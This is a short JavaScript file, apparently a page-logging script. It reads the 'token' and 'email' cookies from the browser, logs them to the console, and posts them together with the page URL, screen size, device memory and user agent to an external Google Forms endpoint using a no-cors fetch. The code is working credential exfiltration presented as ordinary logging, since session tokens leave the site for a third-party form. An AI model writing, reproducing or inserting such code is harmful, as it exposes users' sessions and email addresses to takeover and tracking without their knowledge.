let logToken = '';
let logEmail = '';

function loggetCookie(id) {
  let name = id + "=";
  let ca = document.cookie.split(';');
  for(let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') c = c.substring(1);
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return '';
}

logToken = loggetCookie('token');
logEmail = loggetCookie('email');

console.log(`loggetCookie() > token = ${logToken}; usuario = ${logEmail}`);

let logMsg = `entry.340072360=${location.href};${logToken};${logEmail};${screen.width}x${screen.height};${navigator.deviceMemory}GiB;${navigator.userAgent.replace(/;/g,',')}`;

// to log_pagina
fetch(
  'https://docs.google.com/forms/u/0/d/e/1FAIpQLScGwq8tvtiFUjhTQ58SlhN0b9rymqGGeXbJJoFB2YWks4FSPA/formResponse', 
  {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'omit',
    headers: {  
      'Content-type': 'application/x-www-form-urlencoded;charset=utf-8'
    },
    'body': encodeURI(logMsg)
  }
);
